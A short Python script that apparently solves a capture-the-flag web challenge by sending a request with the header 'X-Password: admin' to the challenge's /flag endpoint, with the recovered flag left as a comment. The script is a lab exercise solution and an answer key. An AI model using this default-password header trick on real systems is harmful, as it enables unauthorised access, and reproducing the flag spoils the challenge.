import requests
headers = {"X-Password" : "admin"}
site = "http://web-03.challs.olicyber.it/flag"

r = requests.get(site,headers=headers)

print(r.text)

#flag{7ru57_m3_i_m_7h3_4dmin}